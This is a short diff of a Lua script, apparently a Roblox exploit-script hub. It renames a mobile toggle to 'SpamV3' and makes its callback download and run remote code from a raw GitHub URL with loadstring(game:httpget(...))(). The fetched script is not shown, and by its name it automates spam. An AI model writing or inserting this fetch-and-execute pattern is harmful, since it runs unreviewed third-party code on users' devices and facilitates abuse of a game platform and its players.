@@ -183,9 +183,9 @@ local section = AddSection(Credits, {"SalvredScripter»"})
 
 
 local Spam = AddMobileToggle({
-  Name = "Toggle",
+  Name = "SpamV3",
   Visible = true,
-  Callback = function()
+  Callback = function()loadstring(game:httpget("https://raw.githubusercontent.com/AdenoxScripterm/AutoDetectV3Spam/main/V3SPAM"))()
     
   end
 })
